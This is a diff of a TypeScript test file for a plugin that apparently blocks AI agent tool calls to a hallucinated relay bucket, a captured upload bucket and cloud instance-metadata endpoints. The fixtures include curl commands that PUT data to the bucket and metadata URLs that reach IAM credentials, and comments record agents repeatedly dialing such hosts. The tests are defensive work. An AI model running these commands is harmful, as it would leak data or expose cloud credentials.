@@ -1,441 +1,172 @@
 import { test } from "node:test"
 import assert from "node:assert/strict"
-import { readFileSync } from "node:fs"
-
 import blockProxy from "../plugin/block-proxy-artifacts.ts"
 
-const { BLOCKED, strings, findBlocked } = blockProxy
-
-// Dead-proxy URL fixture reconstructed from a real hallucinated call. It is
-// assembled from fragments so this source file never contains a contiguous
-// blocklisted token — otherwise the live plugin would block any agent that
-// tries to edit this very test, and GitHub secret scanners would flag the
-// OSSAccessKeyId-shaped parameter.
+// Fragment indicators so this file can be edited while the extension is active.
 const DEAD_URL = [
-  "https://routify",
-  "-file",
-  "-proxy-sg.oss-ap-southeast-1",
-  ".aliyuncs.com/",
-  "proxy_",
-  "temp_file/production/2026-09-21/trace_2101843517899439873655976e0e98/",
-  "requestId_6b581d20398a4d18b56e18d56518c18a/9296a8761c29666465047035c00e57da",
-  "?Expires=1814047991&OSSAccessKeyId=REPLACEDPLACEHOLDER&Signature=Gz9%2F3jH",
+  "https://routify", "-file", "-proxy-sg.oss-ap-southeast-1",
+  ".aliyuncs.com/proxy_", "temp_file/production/trace/request?Signature=example",
 ].join("")
+const UPLOAD_URL = ["https://sanmaohe", ".oss-cn-beijing", ".aliyuncs.com/upload"].join("")
+const META_IP = ["http://169", ".254.169.254/latest/meta-data/"].join("")
+const META_ALI = ["100.100", ".100.200"].join("")
+const META_NAME = ["http://metadata", ".google.internal/computeMetadata/v1/instance/"].join("")
 
-const CLEAN_URLS = [
-  "https://pmc.ncbi.nlm.nih.gov/articles/PMC5795620/",
-  "https://www.ebi.ac.uk/europepmc/webservices/rest/search?query=EXT_ID:28759224",
-  "https://www.targetmol.com/attachment/DataSheet/1B25D990/T11717",
-]
+type Host = Parameters<typeof blockProxy>[0]
+type Handler = Parameters<Host["on"]>[1]
 
-type BeforeHook = (input: unknown, output: { args: unknown }) => Promise<void>
-
-async function beforeHook(): Promise<BeforeHook> {
-  const entry = blockProxy as unknown as {
-    server: () => Promise<Record<string, BeforeHook>>
+function loadPolicy() {
+  let handler: Handler | undefined
+  blockProxy({ on(_event, callback) { handler = callback } })
+  assert.ok(handler)
+  const hook = handler
+  return (input: unknown, session = "s1", toolName = "bash") => {
+    const event = { type: "tool_call", input, toolName, toolCallId: "probe" }
+    return hook(event, { sessionManager: { getSessionId: () => session } })
   }
-  const hooks = await entry.server()
-  const hook = hooks["tool.execute.before"]
-  assert.ok(hook, "plugin must return a tool.execute.before hook from server()")
-  return hook
-}
-
-// V2 path: setup(ctx) must register the same enforcement on the tool domain.
-type V2Before = (event: { tool: string; sessionID: string; input: unknown }) => void
-
-async function v2BeforeHook(): Promise<V2Before> {
-  let hook: V2Before | undefined
-  const ctx = {
-    tool: {
-      hook: async (name: string, callback: V2Before) => {
-        if (name === "execute.before") hook = callback
-      },
-    },
-  }
-  const entry = blockProxy as unknown as { setup: (c: unknown) => Promise<void> }
-  await entry.setup(ctx)
-  assert.ok(hook, "plugin setup() must register ctx.tool.hook('execute.before')")
-  return hook!
-}
-
-function v2Event(sessionID: string, input: unknown) {
-  return { tool: "webfetch", sessionID, input }
 }
 
 function nest(depth: number, leaf: unknown): unknown {
-  let v = leaf
-  for (let i = 0; i < depth; i++) v = [v]
-  return v
+  let value = leaf
+  for (let i = 0; i < depth; i++) value = [value]
+  return value
 }
 
-test("fixtures: four rules, exact incident host first", () => {
-  assert.equal(BLOCKED.length, 4)
-  assert.ok(BLOCKED.every((b) => b.why.length > 0))
-  const hit = findBlocked(DEAD_URL)
-  assert.ok(hit)
-  assert.equal(hit.why, "observed incident host (dead relay bucket)")
-})
-
-test("strings(): primitives", () => {
-  assert.deepEqual([...strings("hello")], ["hello"])
-  for (const junk of [42, null, undefined, true, Symbol("s"), () => 0]) {
-    assert.deepEqual([...strings(junk)], [])
+test("blocks incident arguments across built-in, custom, MCP, and subagent tools", () => {
+  const call = loadPolicy()
+  const shapes = [
+    ["webfetch", { url: DEAD_URL, format: "markdown" }],
+    ["mcp_fetch", { urls: ["https://example.org", DEAD_URL] }],
+    ["bash", { command: `curl -s ${DEAD_URL}` }],
+    ["task", { prompt: { context: "fetch", urls: [DEAD_URL] } }],
+    ["custom_tool", { payload: DEAD_URL.toUpperCase() }],
+    ["write", { path: "report.txt", content: DEAD_URL }],
+  ] as const
+  for (const [tool, args] of shapes) {
+    const before = structuredClone(args)
+    const result = call(args, "incident", tool)
+    assert.equal(result?.block, true, tool)
+    assert.equal(typeof result?.reason, "string")
+    assert.deepEqual(args, before, "blocked arguments must remain unchanged")
   }
 })
 
-test("strings(): arrays, object values, and object keys", () => {
-  const found = new Set(strings({ a: ["x"], b: { c: "y" }, n: null }))
-  assert.deepEqual([...found].sort(), ["a", "b", "c", "n", "x", "y"].sort())
-})
-
-test("strings(): depth cap is 6 container levels", () => {
-  assert.ok([...strings(nest(6, "leaf"))].includes("leaf"))
-  assert.ok(![...strings(nest(7, "leaf"))].includes("leaf"))
-})
-
-test("findBlocked(): exact-host rule, case-insensitive; hostless variants pass by design", () => {
-  const INCIDENT = "observed incident host (dead relay bucket)"
-  assert.equal(findBlocked(DEAD_URL)?.why, INCIDENT)
-  assert.equal(findBlocked(DEAD_URL.toUpperCase())?.why, INCIDENT)
-
-  // Deliberate under-inclusion: the relay-label rule (#2) is host-anchored —
-  // routify + file must sit host-adjacent to an aliyuncs.com/.io endpoint.
-  // Separator-mutated or region-shifted bucket labels on NON-aliyuncs hosts
-  // pass until observed; if one ever does, re-add a token rule (plugin
-  // header explains how).
-  const underscoreHost = [
-    "https://routify",
-    "_file",
-    "_proxy-sg.example.org/download",
-  ].join("")
-  const otherRegion = [
-    "https://routify",
-    "-file",
-    "-proxy-hz.example.net/download",
-  ].join("")
-  assert.equal(findBlocked(underscoreHost), null)
-  assert.equal(findBlocked(otherRegion), null)
-})
-
-test("findBlocked(): same relay bucket on alternate OSS endpoint forms", () => {
-  // Recorded dial #365-366 (forced-wall run) used the DUAL-STACK endpoint
-  // spelling — Alibaba's documented `<bucket>.<region>.oss.aliyuncs.com`
-  // form, live DNS, CT-logged wildcard cert. Fragments keep this file clean.
-  const RELAY = "relay bucket label (any routify-file-* form) on an Aliyun OSS endpoint, com or io TLD"
-  const dualStack = [
-    "https://routify", "-file", "-proxy-sg",
-    ".ap-southeast-1.oss", ".aliyuncs.com/", "proxy_", "temp_file/production/x",
-  ].join("")
-  const internal = [
-    "https://routify", "-file", "-proxy-sg",
-    ".oss-ap-southeast-1-internal", ".aliyuncs.com/x",
-  ].join("")
-  assert.equal(findBlocked({ url: dualStack })?.why, RELAY)
-  assert.equal(findBlocked({ url: internal })?.why, RELAY)
-  // Different bucket on the same alternate endpoint: stays clean.
-  assert.equal(findBlocked("https://my-app.ap-southeast-1.oss.aliyuncs.com/x"), null)
-  // Token mentioned in prose, not as a host: stays clean.
-  assert.equal(
-    findBlocked("audit notes: the routify-file-proxy bucket uploads to aliyuncs.com daily"),
-    null,
-  )
-})
-
-test("findBlocked(): template-family members first dialed by the 2026-09-28/29 surgery runs", () => {
-  // With the PLE n-gram rows ablated, unshielded runs free-generated these
-  // never-before-observed family members (19+26+25 dials; see README
-  // "Weights-level surgery"). The oversea label has NO "proxy" segment and
-  // the eu variant uses the .io TLD — both escaped the pre-surgery rule.
-  const RELAY = "relay bucket label (any routify-file-* form) on an Aliyun OSS endpoint, com or io TLD"
-  const oversea = [
-    "https://routify", "-file", "-oversea",
-    ".oss-acdr-ut-1", ".aliyuncs.com/", "proxy_", "temp_file/production/x",
-  ].join("")
-  const accelerate = [
-    "https://routify", "-file", "-proxy",
-    ".oss-accelerate", ".aliyuncs.com/proxy/temp/x",
-  ].join("")
-  const cnBeijing = [
-    "https://routify", "-file", "-proxy",
-    ".oss-cn-beijing", ".aliyuncs.com/proxy/x",
-  ].join("")
-  const euIo = [
-    "https://routify", "-file", "-proxy-eu",
-    ".oss-eu-west-3", ".aliyuncs.io/proxy_temp_file/x",
-  ].join("")
-  for (const url of [oversea, accelerate, cnBeijing, euIo])
-    assert.equal(findBlocked({ format: "markdown", url })?.why, RELAY, url)
-})
-
-test("findBlocked(): passes legitimate and near-miss input", () => {
-  for (const url of CLEAN_URLS) assert.equal(findBlocked({ url }), null)
-  assert.equal(findBlocked("routify is also a logistics company"), null)
-  assert.equal(findBlocked({ path: "/var/tmp/proxy_temp_file/report.csv" }), null)
-  assert.equal(
-    findBlocked("https://my-backup.oss-cn-hangzhou.aliyuncs.com/dump.tar.gz"),
-    null,
-  )
-  assert.equal(findBlocked("ROUTIFY REPORT 2026 file proxy"), null)
-
-  // Regression for the dropped path rule: a legitimate relay operator's own
-  // bucket may host signed temp-file exports under the same path scheme,
-  // and those can validly return 200.
-  const legitRelayExport = [
-    "https://my-relay.oss-cn-hangzhou",
-    ".aliyuncs.com/",
-    "proxy_",
-    "temp_file/signed-export?sig=valid",
-  ].join("")
-  assert.equal(findBlocked(legitRelayExport), null)
-})
-
-test("findBlocked(): scans object keys, not just values", () => {
-  assert.ok(findBlocked({ [DEAD_URL]: "metadata" }))
-})
-
-test("findBlocked(): nested args respect the depth cap", () => {
-  assert.ok(findBlocked(nest(6, DEAD_URL)))
-  assert.equal(findBlocked(nest(7, DEAD_URL)), null)
-})
-
-test("findBlocked(): tolerates empty and odd argument shapes", () => {
-  for (const args of [undefined, null, {}, [], { a: { b: [null, 1, true] } }]) {
-    assert.equal(findBlocked(args), null)
-  }
-})
-
-test("tool.execute.before: hard-blocks real call shapes from the incident", async () => {
-  const hook = await beforeHook()
-  const input = { tool: "webfetch", sessionID: "test-session", callID: "call-1" }
-
-  const blockedShapes: Record<string, unknown>[] = [
-    // webfetch: the failed call that triggered the original incident
-    { url: DEAD_URL, format: "markdown" },
-    // exa_web_fetch_exa: dead URL hidden in a urls array
-    { urls: [CLEAN_URLS[0], DEAD_URL], maxCharacters: 5000 },
-    // bash: curl of the dead URL
-    { command: `curl -s ${DEAD_URL} | head` },
-    // task: dead URL inside a deeply nested subagent prompt
-    { prompt: { context: "fetch", urls: [DEAD_URL] } },
+test("blocks relay template variants on alternate OSS endpoints", () => {
+  const call = loadPolicy()
+  const hosts = [
+    ["routify", "-file", "-proxy-sg.ap-southeast-1.oss", ".aliyuncs.com"],
+    ["routify", "-file", "-proxy-sg.oss-ap-southeast-1-internal", ".aliyuncs.com"],
+    ["routify", "-file", "-oversea.oss-acdr-ut-1", ".aliyuncs.com"],
+    ["routify", "-file", "-proxy.oss-accelerate", ".aliyuncs.com"],
+    ["routify", "-file", "-proxy.oss-cn-beijing", ".aliyuncs.com"],
+    ["routify", "-file", "-proxy-eu.oss-eu-west-3", ".aliyuncs.io"],
   ]
-
-  for (const args of blockedShapes) {
-    await assert.rejects(
-      hook(input, { args }),
-      (err: unknown) => {
-        assert.match(String(err), /Blocked by block-proxy-artifacts policy/)
-        assert.match(String(err), /Do NOT retry/)
-        return true
-      },
-    )
+  for (const host of hosts) {
+    assert.equal(call({ url: `https://${host.join("")}/download` })?.block, true)
   }
 })
 
-test("tool.execute.before: lets clean calls through untouched", async () => {
-  const hook = await beforeHook()
-  const input = { tool: "webfetch", sessionID: "test-session", callID: "call-2" }
-  for (const url of CLEAN_URLS) {
-    await hook(input, { args: { url, format: "text", timeout: 120 } })
-  }
-  await hook(input, { args: undefined })
-  await hook(input, { args: {} })
-})
-
-test("tool.execute.before: full guidance once per session, terse repeats", async () => {
-  const hook = await beforeHook()
-  const args = { url: DEAD_URL }
-  const mk = (sessionID: string) => ({ tool: "webfetch", sessionID, callID: "c" })
-  const FULL_MARKER = "Go back to the original publisher URL"
-
-  // First occurrence in s1: full teaching guidance.
-  await assert.rejects(hook(mk("s1"), { args }), (e: unknown) => String(e).includes(FULL_MARKER))
-  // Repeat in s1: still blocked, terse, but keeps the anti-retry instruction.
-  await assert.rejects(
-    hook(mk("s1"), { args }),
-    (e: unknown) => !String(e).includes(FULL_MARKER) && String(e).includes("Do NOT retry"),
-  )
-  // A different session still gets full guidance.
-  await assert.rejects(hook(mk("s2"), { args }), (e: unknown) => String(e).includes(FULL_MARKER))
-})
-
-// Cohere 2026-10-26 capture fixtures (same fragment discipline as DEAD_URL:
-// this file must never contain a contiguous rule-3 or rule-4 match).
-const UPLOAD_BUCKET_URL = [
-  "https://sanmaohe",
-  ".oss-cn-beijing",
-  ".aliyuncs.com/upload/test.bin",
-].join("")
-const UPLOAD_BUCKET_DUALSTACK = [
-  "https://sanmaohe",
-  ".oss-cn-beijing.oss",
-  ".aliyuncs.com/upload/test.bin",
-].join("")
-const META_IP = ["http://169", ".254.169.254/latest/meta-data/iam/security-credentials/"].join("")
-const META_IP_ALI = ["100.100", ".100.200"].join("") // bare, no scheme
-const META_NAME = ["http://metadata", ".google.internal/computeMetadata/v1/instance/"].join("")
-
-test("rules 3-4: hard-block the Cohere 2026-10-26 capture shapes", async () => {
-  const hook = await beforeHook()
-  const input = { tool: "webfetch", sessionID: "r34-session", callID: "call-1" }
-  const bucketShapes: unknown[] = [
-    { url: UPLOAD_BUCKET_URL, format: "markdown" },
-    { urls: [CLEAN_URLS[0], UPLOAD_BUCKET_DUALSTACK], maxCharacters: 5000 },
-    { command: `curl -s -m 10 -o /tmp/put_probe -X PUT --data-binary "PROBE_PAYLOAD" ${UPLOAD_BUCKET_URL} -w "HTTP:%{http_code}"` },
-  ]
-  const metaShapes: unknown[] = [
+test("blocks captured upload targets and metadata addresses in arbitrary arguments", () => {
+  const call = loadPolicy()
+  const inputs = [
+    { url: UPLOAD_URL },
+    { urls: [["https://sanmaohe", ".oss-cn-beijing.oss", ".aliyuncs.io/upload"].join("")] },
+    { command: `curl -X PUT --data-binary payload ${UPLOAD_URL}` },
     { url: META_IP },
-    { url: "http://" + META_IP_ALI + "/latest/meta-data/" },
-    { url: META_NAME },
-    { server: META_IP_ALI }, // bare metadata IP as a plain argument value
+    { server: META_ALI },
+    { url: `http://${META_ALI}/latest/meta-data/` },
+    { url: META_NAME.toUpperCase() },
   ]
-  for (const args of bucketShapes) {
-    await assert.rejects(
-      hook(input, { args }),
-      (err: unknown) => {
-        assert.match(String(err), /Blocked by block-proxy-artifacts policy/)
-        assert.match(String(err), /upload-target bucket/)
-        return true
-      },
-    )
-  }
-  for (const args of metaShapes) {
-    await assert.rejects(
-      hook(input, { args }),
-      (err: unknown) => {
-        assert.match(String(err), /Blocked by block-proxy-artifacts policy/)
-        assert.match(String(err), /instance-metadata endpoint/)
-        return true
-      },
-    )
-  }
+  for (const input of inputs) assert.equal(call(input)?.block, true)
 })
 
-test("rules 3-4: near-misses pass through untouched", async () => {
-  const hook = await beforeHook()
-  const nearMisses: unknown[] = [
-    // the ordinary blog that 'https://sanmaohe' actually completes to locally
-    { url: "https://sanmaoheling.com/blogs/news.atom" },
+test("scans object keys and values through depth six", () => {
+  const call = loadPolicy()
+  assert.equal(call({ [DEAD_URL]: "metadata" })?.block, true)
+  assert.equal(call({ nested: [{ [META_ALI]: null }] })?.block, true)
+  assert.equal(call(nest(6, DEAD_URL))?.block, true)
+  assert.equal(call(nest(7, DEAD_URL)), undefined)
+})
+
+test("allows legitimate sources and indicator near misses without modifying arguments", () => {
+  const call = loadPolicy()
+  const inputs = [
+    { url: "https://pmc.ncbi.nlm.nih.gov/articles/PMC5795620/" },
+    { url: "https://www.ebi.ac.uk/europepmc/webservices/rest/search?query=EXT_ID:28759224" },
+    { url: "https://www.targetmol.com/attachment/DataSheet/1B25D990/T11717" },
     { url: "https://my-backup.oss-cn-beijing.aliyuncs.com/legit-object.tar.gz" },
-    { command: "grep -ri sanmaohe ./docs/" }, // label alone, no aliyuncs endpoint
-    { url: "http://169.254.1.1/other-link-local" }, // not the metadata address
-    { url: "http://" + ["1", ".169.254", ".169.254"].join("") + "/longer-address" }, // boundary: digit-prefixed
-    { url: "http://100.100.100.201/" }, // boundary: neighbor address
-    { version: ["169.254", ".169.2540", "-1"].join("") }, // boundary: trailing digit
+    { url: "https://my-app.ap-southeast-1.oss.aliyuncs.com/x" },
+    { url: "https://my-relay.oss-cn-hangzhou.aliyuncs.com/proxy_temp_file/signed-export?sig=valid" },
+    { url: ["https://routify", "_file", "_proxy-sg.example.org/download"].join("") },
+    { url: ["https://routify", "-file", "-proxy-hz.example.net/download"].join("") },
+    { notes: "audit notes: the routify-file-proxy bucket uploads to aliyuncs.com daily" },
+    { notes: "routify is also a logistics company" },
+    { path: "/var/tmp/proxy_temp_file/report.csv" },
+    { url: "https://sanmaoheling.com/blogs/news.atom" },
+    { command: "grep -ri sanmaohe ./docs/" },
+    { url: "http://169.254.1.1/other-link-local" },
+    { url: "http://" + ["1", ".169.254", ".169.254"].join("") + "/longer-address" },
+    { url: "http://100.100.100.201/" },
+    { version: ["169.254", ".169.2540", "-1"].join("") },
     { url: "https://metadata.example.com/google/internal" },
   ]
-  for (const input of nearMisses) {
-    assert.equal(findBlocked(input), null, `should pass: ${JSON.stringify(input)}`)
+  for (const input of inputs) {
+    const before = structuredClone(input)
+    assert.equal(call(input), undefined, JSON.stringify(input))
+    assert.deepEqual(input, before)
   }
 })
 
-test("rules 3-4: family-specific guidance; legacy rules keep publisher guidance", async () => {
-  const hook = await beforeHook()
-  const msg = async (args: unknown, sessionID: string) => {
-    try {
-      await hook({ sessionID, tool: "webfetch", callID: "c" }, { args })
-      return ""
-    } catch (e) {
-      return String(e)
-    }
-  }
-  // rule 4 first-hit guidance: credential framing, no fetch-elsewhere advice
-  assert.match(await msg({ url: META_IP }, "s-meta"), /credential/)
-  assert.doesNotMatch(await msg({ url: META_IP }, "s-meta2"), /publisher URL/)
-  // rule 4 repeats: terse credential one-liner, no IAM paragraph
-  const metaRepeat = await msg({ url: META_IP }, "s-meta")
-  assert.match(metaRepeat, /credential surface/)
-  assert.doesNotMatch(metaRepeat, /IAM/)
-  // rule 3 first-hit guidance: upload framing
-  assert.match(await msg({ url: UPLOAD_BUCKET_URL }, "s-bucket"), /upload endpoint/)
-  // rule 1 unchanged: dead-relay publisher guidance
-  assert.match(await msg({ url: DEAD_URL }, "s-relay"), /publisher URL/)
-  assert.match(await msg({ url: DEAD_URL }, "s-relay"), /relay middlebox/)
-})
-
-test("V2 setup(): rules 3-4 block through the tool domain too", async () => {
-  const hook = await v2BeforeHook()
-  for (const input of [{ url: UPLOAD_BUCKET_DUALSTACK }, { url: META_NAME }, { command: "curl -m 2 http://" + META_IP_ALI + "/latest/" }]) {
-    assert.throws(
-      () => hook(v2Event("v2-r34", input)),
-      (err: unknown) => {
-        assert.match(String(err), /Blocked by block-proxy-artifacts policy/)
-        return true
-      },
-    )
+test("allows empty and non-string inputs", () => {
+  const call = loadPolicy()
+  for (const input of [undefined, null, {}, [], 42, true, { a: { b: [null, 1, true] } }]) {
+    assert.equal(call(input), undefined)
   }
 })
 
-test("self-compatibility: blocklist never matches the plugin's own sources", () => {
-  // If someone pastes a live proxy URL (or rewrites a regex to match its own
-  // source) into the plugin or its tests, an agent with the plugin installed
-  // could no longer edit or even grep these files without disabling the
-  // plugin first. This test makes that mistake fail CI. The README is
-  // deliberately excluded: it documents the real indicator and must keep it.
-  const sources = [
-    new URL("../plugin/block-proxy-artifacts.ts", import.meta.url),
-    new URL(import.meta.url),
-    new URL("../tools/repro.py", import.meta.url),
-  ]
-  for (const src of sources) {
-    assert.equal(findBlocked(readFileSync(src, "utf8")), null, `${src} contains a live token`)
+test("warning history follows the current session and is independent per factory", () => {
+  const call = loadPolicy()
+  const first = call({ url: DEAD_URL }, "s1")!
+  const repeat = call({ url: DEAD_URL }, "s1")!
+  assert.equal(first.block, true)
+  assert.equal(repeat.block, true)
+  assert.notEqual(first.reason, repeat.reason)
+  assert.deepEqual(call({ url: DEAD_URL }, "s2"), first)
+  assert.deepEqual(call({ url: DEAD_URL }, "s1"), repeat)
+  assert.deepEqual(loadPolicy()({ url: DEAD_URL }, "s1"), first)
+})
+
+test("clean calls do not consume first-warning guidance", () => {
+  const call = loadPolicy()
+  call({ url: "https://example.org" })
+  assert.deepEqual(call({ url: DEAD_URL }), loadPolicy()({ url: DEAD_URL }))
+})
+
+test("each indicator family keeps distinct first and repeat guidance without echoing the URL", () => {
+  const call = loadPolicy()
+  const firstReasons = new Set<string>()
+  const repeatReasons = new Set<string>()
+  for (const url of [DEAD_URL, UPLOAD_URL, META_IP]) {
+    const first = call({ url }, url)!
+    const repeat = call({ url }, url)!
+    assert.equal(first.block, true)
+    assert.equal(repeat.block, true)
+    assert.notEqual(first.reason, repeat.reason)
+    assert.equal(first.reason.includes(url), false)
+    assert.equal(repeat.reason.includes(url), false)
+    firstReasons.add(first.reason)
+    repeatReasons.add(repeat.reason)
   }
+  assert.equal(firstReasons.size, 3)
+  assert.equal(repeatReasons.size, 3)
 })
 
-test("opencode loader contract: single dual-form default export (regression: silent plugin death)", async () => {
-  // V1's loader iterates EVERY module export and accepts only functions or
-  // (since 1.18.29) objects with a callable `server`, throwing
-  // "Plugin export is not a function" otherwise — the whole plugin then
-  // silently does not load (a live incident dials unblocked; the error only
-  // surfaces in the log). V2 reads the default export's `id` and `setup`.
-  // Named exports of internals are therefore forbidden.
-  const mod = await import("../plugin/block-proxy-artifacts.ts")
-  assert.deepEqual(Object.keys(mod), ["default"])
-  const plugin = mod.default
-  assert.equal(typeof plugin, "object")
-  assert.equal(typeof plugin.server, "function", "V1 entrypoint: server()")
-  assert.equal(typeof plugin.setup, "function", "V2 entrypoint: setup(ctx)")
-  assert.equal(typeof plugin.id, "string")
-  assert.ok(plugin.id.length > 0)
-})
-
-test("V2 setup(): hard-blocks the same real call shapes as V1", async () => {
-  const hook = await v2BeforeHook()
-  const blockedShapes: unknown[] = [
-    { url: DEAD_URL, format: "markdown" },
-    { urls: [CLEAN_URLS[0], DEAD_URL], maxCharacters: 5000 },
-    { command: `curl -s ${DEAD_URL} | head` },
-    { prompt: { context: "fetch", urls: [DEAD_URL] } },
-  ]
-  for (const input of blockedShapes) {
-    assert.throws(
-      () => hook(v2Event("v2-blocked", input)),
-      (err: unknown) => {
-        assert.match(String(err), /Blocked by block-proxy-artifacts policy/)
-        assert.match(String(err), /Do NOT retry/)
-        return true
-      },
-    )
-  }
-})
-
-test("V2 setup(): lets clean calls through untouched", async () => {
-  const hook = await v2BeforeHook()
-  for (const url of CLEAN_URLS) {
-    hook(v2Event("v2-clean", { url, format: "text", timeout: 120 }))
-  }
-  hook(v2Event("v2-clean", undefined))
-  hook(v2Event("v2-clean", {}))
-})
-
-test("V2 setup(): full guidance once per session, terse repeats", async () => {
-  const hook = await v2BeforeHook()
-  const input = { url: DEAD_URL }
-  const FULL_MARKER = "Go back to the original publisher URL"
-
-  assert.throws(() => hook(v2Event("s1", input)), (e: unknown) => String(e).includes(FULL_MARKER))
-  assert.throws(
-    () => hook(v2Event("s1", input)),
-    (e: unknown) => !String(e).includes(FULL_MARKER) && String(e).includes("Do NOT retry"),
-  )
-  assert.throws(() => hook(v2Event("s2", input)), (e: unknown) => String(e).includes(FULL_MARKER))
+test("warning-state eviction restores first guidance without ever allowing a blocked call", () => {
+  const call = loadPolicy()
+  const first = call(DEAD_URL, "s0")!
+  const repeat = call(DEAD_URL, "s0")!
+  for (let i = 1; i < 500; i++) assert.deepEqual(call(DEAD_URL, `s${i}`), first)
+  assert.deepEqual(call(DEAD_URL, "s0"), repeat)
+  assert.deepEqual(call(DEAD_URL, "s500"), first)
+  assert.deepEqual(call(DEAD_URL, "s0"), first)
 })
